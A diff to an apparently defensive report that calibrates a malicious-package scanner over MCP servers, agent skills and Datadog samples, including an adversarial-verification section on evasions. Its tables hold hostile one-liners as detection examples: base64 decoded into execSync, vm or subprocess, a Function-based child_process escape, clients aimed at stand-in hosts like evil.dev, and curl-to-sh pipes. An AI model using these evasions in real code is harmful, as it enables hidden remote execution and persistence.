@@ -70,7 +70,7 @@ Selection, all deterministic (sorted, no `random`):
 169 were fetched; 4 archives over the 30 MB download cap were recorded and
 skipped (`com.sigasi/magic-hdl`, `io.github.SAP/mdk-mcp-server`,
 `io.github.appwrite/mcp`, `io.github.zscaler/zscaler-mcp-server`). The 169
-unpack to 34,446 files (468 MB; median 27 files per server). The manifest
+unpack to 34,446 files (491.6 MB, i.e. 469 MiB; median 27 files per server). The manifest
 records each server's name, version, package, archive URL and SHA-256;
 `fetch_mcp_clean.py --from-manifest` rebuilds the same corpus byte for byte
 (it was rebuilt that way during this pass: 169/169 archives matched).
@@ -216,11 +216,11 @@ argument decides; a regex on one line cannot see either.
 
 | Rule | Severity | Change | MCP |
 |---|---|---|---:|
-| CRED-006 | Critical (corroborate) | The PEM header must be followed by key material (16+ base64 characters after `\n` or after spaces, as in a key flattened onto one line) or stand alone on its line; `\n...`, a `...` body, `startsWith('-----BEGIN…')` and PEM builders are not keys | 4 |
-| INFER-001 | High | Only an OpenAI/Anthropic client whose `base_url`/`baseURL` is a hardcoded URL other than a documented provider or local server (the hermes-px shape). A URL taken from configuration is not reported | 1 |
-| INFER-004/005 | High | Secret-named variables only (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`), and not in an auth header or a log/error call: the rule is "secret in prompt text" | 15 / 21 |
+| CRED-006 | Critical (corroborate) | The PEM header must be followed by key material (16+ base64 characters after `\n`, after spaces as in a key flattened onto one line, or in the next string literal of an array or `+` concatenation; or a legacy `Proc-Type:` header) or stand alone on its line; `\n...`, a `...` body, `startsWith('-----BEGIN…')` and PEM builders around a variable are not keys. A placeholder body (`...`, `<…>`, `[…]`, `YOUR…`) is recognised only on the line right after the BEGIN line | 4 |
+| INFER-001 | High | Only an OpenAI/Anthropic client whose `base_url`/`baseURL` is a hardcoded URL other than a documented provider or local server (the hermes-px shape), the allowed host matched as a whole host (`://api.openai.com/`, not `api.openai.com.relay.dev`). A URL taken from configuration is not reported | 1 |
+| INFER-004/005 | High | Secret-named variables only (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`, in any case: `process.env.apiKey`), and not in an auth header or a log/error call: the rule is "secret in prompt text" | 15 / 21 |
 | INFER-006/007, CRED-007, CRED-008 | as before | Placeholder values (`"YOUR_…`, `your-…`, `mock-…`, a value ending `1234567890"`) and PKG-INFO copies of the README | 1 / 1 / 21 / 16 |
-| CODE-008/009 | High | `Function(…)` needs a runtime argument: literal-only calls (`Function('return this')()`, `new Function("")`, `new Function("modulePath", "return import(modulePath)")`) compile fixed code; the ajv, depd, function-bind and zod code generators are named and skipped. Python's `class Function` is not the constructor | 20 / 17 |
+| CODE-008/009 | High | `Function(…)` needs a runtime argument: literal-only calls (`Function('return this')()`, `new Function("")`, `new Function("modulePath", "return import(modulePath)")`) compile fixed code, unless the literal reaches for `process`, `require`, `child_process`, `mainModule`, `fromCharCode` or `atob` (`Function("return process")()`); the ajv, depd, function-bind and zod code generators are named and skipped. Python's `class Function` is not the constructor | 20 / 17 |
 | CODE-002 | High | `exec([argv…])` (an argument list, never Python's `exec`) and `$exec(regex)` are not code execution | 15 |
 | CODE-006 | High → Medium | `yaml.load` deserialises untrusted input (a vulnerability, not an attack by the package); `SafeLoader` forms are not reported | 7 |
 | OBFUSC-CHAIN-006 | High | Zero-width characters inside Arabic-script and Indic words (zod's fa locale ships in most bundled servers) and in acorn/iconv code-point tables are skipped; next to ASCII, next to whitespace, in runs, or in emoji sequences they still fire | 12 |
@@ -228,11 +228,11 @@ argument decides; a regex on one line cannot see either.
 | OBFUSC-006 | High | Sequential byte tables as a JS bundler writes them (`\x05\x06\x07\b`, `\v\f\r\x0E\x0F\x10\x11`; Python's bytes repr never writes `\b`, `\v` or `\f`, so an embedded binary in a `.py` dropper still fires) are not an encoded payload | 1 |
 | SKILL-003 | Critical | No longer reads package.json: npm `scripts` entries are not skill-manifest commands, and the ones npm runs on install are INSTALL-003/004's job | 4 |
 | SUPPLY-001 | Critical | `.jsonl` data files are data | 5 |
-| SUPPLY-002 | High | `engines`/`devEngines` ranges (`"node": "^20 \|\| >=23"`) are not dependency hijacks | 3 |
+| SUPPLY-002 | High | `engines`/`devEngines` ranges (`"node": "^20 \|\| >=23"`, `"version": "^22 \|\| …"`) are not dependency hijacks; the package's own `"version": "1.0.0"` on a one-line package.json does not excuse the line | 3 |
 | SUPPLY-008 | High | Same named code generators as CODE-008 | 9 |
 | SUPPLY-009 | High | `.exec(` and `.Function(` method calls (RegExp#exec in minified code) do not count | 6 |
 | NET-013 | High | IMDS addresses named in an SSRF blocklist or comment (`SSRF`, `IPv4-mapped`, `link-local`, `RFC1918`, `fc00::/7`) | 4 |
-| PERSIST-005 | High | Shell-completion install lines | 5 |
+| PERSIST-005 | High | Shell-completion install lines (`completions bash >> ~/.bashrc`, yargs' `{{completion_command}} >>`); the bare word `completion`, which in agent code also names model output, does not excuse a write | 5 |
 | PERSIST-013 | High | macOS `_CodeSignature/CodeResources` manifests (their rules list `LoginItems` as a path) | 1 |
 
 **New rules (recall kept on precise shapes).**
@@ -241,13 +241,14 @@ argument decides; a regex on one line cannot see either.
 |---|---|---|---|
 | OBFUSC-012 | High | base64 decode of an inline literal of 40+ encoded characters (`exec(b64decode('…'))`, `atob('…')`, `Buffer.from('…', 'base64')`) | the payload half of OBFUSC-001/002/003 |
 | OBFUSC-013 | High | base64 decode of a reversed string (`atob(s.split('').reverse().join(''))`, `b64decode(s[::-1])`) | 1unitest 1.0.1, whose only High was `atob` |
-| NET-CLEAR-001 | High | An API base URL or endpoint constant hardcoded to a plaintext `http://` remote host (local, private and documentation hosts skipped) | banana-proxy, whose only High was `Buffer.from(…, 'base64')` |
+| OBFUSC-014 | High | base64 decode fed straight into a code or command sink: `vm.runInThisContext(Buffer.from(x, 'base64')…)`, `new vm.Script(…)`, `execSync(Buffer.from(…))`, `cp.exec(atob(c))`, `setTimeout(atob(p))`, `subprocess.run(b64decode(c)…)`, `compile(b64decode(…))`, and `eval`/`exec`/`Function` | added by the verifier pass: these runtime-value forms were High only through OBFUSC-001/002/003, and nothing else reported the vm, child_process, setTimeout and subprocess ones |
+| NET-CLEAR-001 | High | An API base URL or endpoint constant hardcoded to a plaintext `http://` remote host (local, private and documentation hosts skipped, matched as whole labels: `.local"` but not `.localtunnel.me`) | banana-proxy, whose only High was `Buffer.from(…, 'base64')` |
 | NET-RCE-002 | Critical | Download piped into a shell or `iex` through a URL shortener (is.gd, bit.ly, tinyurl, …) | jianying-editor-skill, whose block leaned on a PNG decode |
 | CRED-044 | High | `browser_cookie3` declared beside a Discord webhook client in setup.py, pyproject.toml, requirements or package.json (the 2022 Roblox/Discord typosquat set) | `Roblox.-com`, which had no finding at all |
 
 NET-CLEAR-001, NET-RCE-002 and CRED-044 are in the network and credentials
-packs, so the Datadog evaluation's offline phases see them; OBFUSC-012/013 are
-in the obfuscation pack.
+packs, so the Datadog evaluation's offline phases see them; OBFUSC-012/013/014
+are in the obfuscation pack.
 
 Hits of each changed rule at High or Critical, before → after (samples):
 
@@ -291,7 +292,9 @@ Hits of each changed rule at High or Critical, before → after (samples):
 | CRED-044 | 0 → 0 | 0 → 0 | 0 → 0 | 0 → 9 |
 
 "MCP servers" counts the 169 servers, "Datadog" the 844 packages, each with
-the rule at High or Critical. These per-rule counts are not corrected for the
+the rule at High or Critical. The "after" column is the lane's build
+(80c0e35); the verifier's fixes (see "Adversarial verification") only add
+findings and change no verdict on the MCP or skills corpora. These per-rule counts are not corrected for the
 scan budget, so a server whose bundle was cut short in one run can differ
 between runs with no rule change: the final run and the previous build's run
 differ on INFER-004/005 (`localstack-mcp-server`) and OBFUSC-006/OBFUSC-012
@@ -409,6 +412,113 @@ line" under Known gaps).
   including the OSV dependency lookup; known-vulnerable dependencies block two
   MCP servers on their own. The Datadog runs use the offline phases only.
 
+## Adversarial verification
+
+A second pass (branch `ws/mcpfp-v`) rebuilt the lane's final commit
+(80c0e35) itself, reproduced the measurements above, and wrote attack
+variants of every rule this pass narrowed or downgraded.
+
+```
+Data Source: Real samples (the same corpora as above) for the benchmarks;
+             hand-written attack variants (synthetic, one line or one small
+             file each) for the rule checks.
+Sample Size: 169 MCP servers; 204 + 455 skills; 844 Datadog samples; 4 of the
+             17 SkillSpector servers rescanned; 56 variant files.
+Limitations: The variants are the verifier's own guesses at evasions, not
+             samples from the wild; a rule that now catches them is not shown
+             to catch anything else. The fixes below were checked against the
+             same in-sample corpora as the calibration itself.
+```
+
+**Reproduced.** The corpus rebuilt from the committed manifest matched all
+169 SHA-256 digests and the unpacked tree is identical to the one measured.
+Re-running the selection on the saved registry snapshot gives the same 173
+names, and the manifest was written (00:23 UTC) before the first scan of the
+corpus (00:37 UTC), so the publisher list was not tuned on results. With the
+verifier's own build of 80c0e35: MCP 38/169 blocked and 123/169 warned, the
+same verdict on every server as the lane's run (9 servers hit the scan budget,
+all already blocked); skills 171/204 and 182/204 malicious, 7/455 and 70/455
+clean, identical per sample; Datadog DD_REPRO. SkillSpector rescanned on 4 of
+the 17 servers gave the same verdicts.
+
+**Attack variants that the narrowing let through.** Each line is the highest
+finding of the rule family on the variant, with the bd6b06d build, the lane's
+80c0e35 build, and after the verifier's fixes:
+
+| Variant | bd6b06d | 80c0e35 | Fixed |
+|---|---|---|---|
+| PEM key as array elements joined at run time, one line | CRED-006 C | — | CRED-006 C |
+| PEM key by `+` concatenation with `"\n"` as its own literal | CRED-006 C | — | CRED-006 C |
+| Encrypted legacy PEM in a string (`\nProc-Type: 4,ENCRYPTED`) | CRED-006 C | — | CRED-006 C |
+| Ed25519 PKCS#8 key (one-line body) in XML, END line followed by `</privateKey>` | CRED-006 C | — | CRED-006 C |
+| Same key in an INI file, END line followed by `[server]` | CRED-006 C | — | CRED-006 C |
+| RSA key with an unwrapped body inside `<pre>` | CRED-006 C | — | CRED-006 C |
+| `vm.runInThisContext(Buffer.from(x, 'base64').toString())` | OBFUSC-003 H | L | OBFUSC-014 H |
+| `vm.runInNewContext(Buffer.from(p, 'base64')…)` | OBFUSC-003 H | L | OBFUSC-014 H |
+| `require('child_process').execSync(Buffer.from(cmd, 'base64').toString())` | OBFUSC-003 H | L | OBFUSC-014 H |
+| `cp.exec(atob(c))`, `setTimeout(atob(p))` | OBFUSC-002 H | L | OBFUSC-014 H |
+| `subprocess.run(base64.b64decode(c).decode(), shell=True)`, `compile(b64decode(blob), …)` | OBFUSC-001 H | L | OBFUSC-014 H |
+| `Function("return process")().mainModule.require('child_process').execSync(cmd)` | CODE-008 H | — | CODE-008 H |
+| `` `…${process.env.openai_api_key}` `` or `` `…${process.env.apiKey}` `` in a prompt | INFER-005 H | — | INFER-005 H |
+| `OpenAI(base_url='https://api.openai.com.evil.dev/v1')`, `…localhost.evil.dev…` | INFER-001 H | — | INFER-001 H |
+| `open("~/.bashrc", "a").write(completion.choices[0].message.content)` | PERSIST-005 H | — | PERSIST-005 H |
+| One-line package.json with `"left-pad":"1.3.0 \|\| 99.0.0"` | SUPPLY-002 H | — | SUPPLY-002 H |
+| `API_BASE_URL = "http://relay.localtunnel.me/v1"` (also `.testing-relay.ru`, `.lanzou.com`, `.corporate-proxy.cn`) | (rule new) | — | NET-CLEAR-001 H |
+
+The causes: CRED-006's placeholder words (`KEY-----\n<`, `KEY-----\n[`, …)
+were read in a four-line window and also matched the END line of a short key,
+and its pattern accepted key material only right after the header; the
+runtime-value base64 forms had no High rule once OBFUSC-001/002/003 became
+observations (eval, exec and Function are still caught by CODE-001/002/008,
+but vm, child_process, setTimeout, subprocess and compile were not); and
+several suppression words matched as substrings (`api.openai.com` inside
+`api.openai.com.evil.dev`, `.local` inside `.localtunnel.me`, `completion`
+inside model-output code, the package's own `"version":` on a one-line
+manifest). The fixes are in the tables above: CRED-006's pattern and
+BEGIN-anchored placeholder words, the new OBFUSC-014, CODE-008/009's literal
+exception, case-insensitive secret names in INFER-004/005, and host- and
+command-shaped suppression words for INFER-001, NET-CLEAR-001, PERSIST-005 and
+SUPPLY-002. Every fix only adds findings; `cli/src/corpus/mcp_fp_tests.rs`
+has a test for each variant.
+
+**Effect of the fixes (full reruns):**
+
+| | 80c0e35 | Fixed |
+|---|---:|---:|
+| MCP blocked (≥ HIGH) | 38/169 | 38/169 |
+| MCP warned (≥ MEDIUM) | 123/169 | 123/169 |
+| Skills malicious blocked / warned | 171/204, 182/204 | 171/204, 182/204 |
+| Skills clean blocked / warned | 7/455, 70/455 | 7/455, 70/455 |
+| Datadog ≥ High | DD_HIGH_A | DD_HIGH_B |
+| Datadog ≥ Critical | DD_CRIT_A | DD_CRIT_B |
+
+No verdict changed on any MCP server or skill. The one server that hit the
+scan budget below HIGH in the fixed run (`com.appfigures/mcp`) was rescanned
+with the budget off and stayed MEDIUM. OBFUSC-014 added a High to one
+malicious skill (`cisco-ai-defense-skill-scanner-magic-string-trigger`, already
+HIGH) and to DD_O14 Datadog samples; it fired on no clean MCP server or skill.
+
+**Variants still not reported at High** (left as known gaps):
+
+- A base64 literal shorter than 40 characters decoded into a network call
+  (`urlopen(b64decode('aHR0cHM6Ly9ldmlsLmNvbS9j'))`) is now only OBFUSC-001
+  Low. No decoded literal of 16–39 characters occurs in any of the three
+  corpora, so the threshold has no measured cost or benefit either way.
+- A JavaScript LLM client configured over several lines
+  (`new OpenAI({` … `baseURL: 'https://relay.evil.dev/v1'`) is INFER-002 Low:
+  INFER-001 needs the client and the URL on one line, and a bare `baseURL:`
+  line cannot tell an LLM client from any HTTP client.
+- `exec(['curl …', 'sh'].join('|'))` no longer fires CODE-002, which skips
+  `exec([` as an argument list.
+- INFER-004/005's `headers` word hides a secret-in-prompt that shares a line
+  with a `headers` object (`{ headers, body: … `${process.env.SECRET_KEY}` }`).
+- Zero-width characters between two non-ASCII letters no longer fire
+  OBFUSC-CHAIN-006, so one inserted inside a CJK or Cyrillic injection
+  phrase splits it silently. Not reverted: ZWSP between letters is correct
+  Khmer and Thai (a Khmer strings file in a Datadog-bundled SDK has one).
+- A `Function` literal with a hex-escaped body no longer fires CODE-008; the
+  escapes still fire OBFUSC-006 High.
+
 ## Known gaps
 
 - **In-sample.** Every change was written after reading these 169 servers, so
@@ -456,7 +566,10 @@ line" under Known gaps).
   match on long lines are the CODE-008/009 and SUPPLY-008 generator names
   inside library bundles (asyncapi, antv, protobufjs; none in a payload file
   of this dataset), INFER-004/005's `Bearer ` on two MCP servers, and one
-  benign line each for CRED-008 and PERSIST-005. The robust fix is in the
+  benign line each for CRED-008 and PERSIST-005 (PERSIST-005's word,
+  `completion`, was later narrowed to completion-install commands by the
+  verifier pass, as were the substring host words of INFER-001 and
+  NET-CLEAR-001 and SUPPLY-002's `"version":`). The robust fix is in the
   engine (test the word within a window around the match), which is outside
   this pass.
 - **OSV depends on the day.** Two servers are blocked by dependency advisories
